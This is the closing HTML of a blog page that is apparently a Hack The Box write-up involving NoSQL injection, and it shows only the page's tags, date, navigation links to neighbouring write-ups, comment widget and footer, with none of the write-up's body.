                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg><span class="tag"><a href="https://foresthex.com/tags/ctf">ctf</a></span><span class="tag"><a href="https://foresthex.com/tags/hackthebox">HackTheBox</a></span><span class="tag"><a href="https://foresthex.com/tags/pentesting">pentesting</a></span><span class="tag"><a href="https://foresthex.com/tags/nosqli">NoSQLi</a></span><span class="tag"><a href="https://foresthex.com/tags/python">Python</a></span><span class="tag"><a href="https://foresthex.com/tags/custom-exploitation">Custom Exploitation</a></span>
                </p>

            <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path><polyline points="14 2 14 8 20 8"></polyline><line x1="16" y1="13" x2="8" y2="13"></line><line x1="16" y1="17" x2="8" y2="17"></line><polyline points="10 9 9 9 8 9"></polyline></svg>2223 Words</p>

            <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line></svg>2020-06-04 00:00 &#43;0000</p>
        </div>

        
            <div class="pagination">
                <div class="pagination__title">
                    <span class="pagination__title-h"></span>
                    <hr />
                </div>

                <div class="pagination__buttons">
                    
                        <span class="button previous">
                            <a href="https://foresthex.com/posts/hack-the-box-traverxec/">
                                <span class="button__icon">‚Üê</span>
                                <span class="button__text">Hack The Box - Traverxec</span>
                            </a>
                        </span>
                    

                    
                        <span class="button next">
                            <a href="https://foresthex.com/posts/hack-the-box-obscurity/">
                                <span class="button__text">Hack The Box - Obscurity</span>
                                <span class="button__icon">‚Üí</span>
                            </a>
                        </span>
                    
                </div>
            </div>
        


        <div id="comments" class="thin"><script src="https://utteranc.es/client.js"
        repo="wgehalo/wgehalo.github.io"
        issue-term="pathname"
        label="comment"
        theme="photon-dark"
        crossorigin="anonymous"
        async>
</script></div>

    </main>

            </div>

            
                <footer class="footer">
    <div class="footer__inner">
        <div class="footer__content">
            <span>&copy; 2020</span>
            
                <span><a href="https://foresthex.com/">Brian G.</a></span>
            
            <span><a href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC BY-NC 4.0</a></span>
            <span> <a href="https://foresthex.com/posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span>
        </div>
    </div>
    <div class="footer__inner">
        <div class="footer__content">
            <span>Powered by <a href="http://gohugo.io">Hugo</a></span>
            <span>Made with &#10084; by <a href="https://github.com/rhazdon">rhazdon</a></span>
        </div>
    </div>
</footer>

            
        </div>

        




<script type="text/javascript" src="https://foresthex.com/bundle.min.2d5469329143160ae2456a69c3c76dc2d0a3b212b46afe291a51bd68650ed6f8697e001dab54f1c272c77ce08092a8c55e5bb4314e0ee334aab4b927ec896638.js" integrity="sha512-LVRpMpFDFgriRWppw8dtwtCjshK0av4pGlG9aGUO1vhpfgAdq1TxwnLHfOCAkqjFXlu0MU4O4zSqtLkn7IlmOA=="></script>



    </body>
</html>
